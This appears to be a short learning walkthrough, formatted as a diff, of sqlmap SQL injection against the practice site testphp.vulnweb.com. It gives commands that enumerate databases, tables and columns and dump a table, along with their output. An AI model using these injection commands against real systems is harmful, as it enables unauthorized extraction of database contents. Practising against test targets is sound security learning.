@@ -1,0 +1,36 @@
+1: command; └─$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+available databases found: 2[acuart, information_schema]
+
+
+2: command; └─$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+found 8 tables: 
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+Next step is to retrive the data from desired table.
+
+command; └─$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -dump
+
+command to retrieve the columns of a desired table;
+└─$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T products --columns                                    
+
+output;
+Table: products
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| description | text         |
+| id          | int unsigned |
+| name        | text         |
+| price       | int unsigned |
+| rewritename | text         |
++-------------+--------------+
